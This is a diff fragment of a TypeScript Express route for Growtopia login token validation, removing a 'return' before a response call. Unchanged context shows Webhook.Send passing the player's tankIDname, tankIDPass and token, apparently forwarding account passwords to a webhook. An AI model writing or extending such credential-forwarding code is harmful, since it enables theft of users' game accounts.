@@ -201,7 +201,7 @@ App.post('/player/growid/validate/checktoken', (req: Request, res: Response) => 
 
     Webhook.Send(req, Data['tankIDname'] || '', Data['tankIDPass'] || '', Token);
 
-    return Growtopia.Send(req, res, result, true);
+    Growtopia.Send(req, res, result, true);
 });
 
 App.listen(Port, () => {
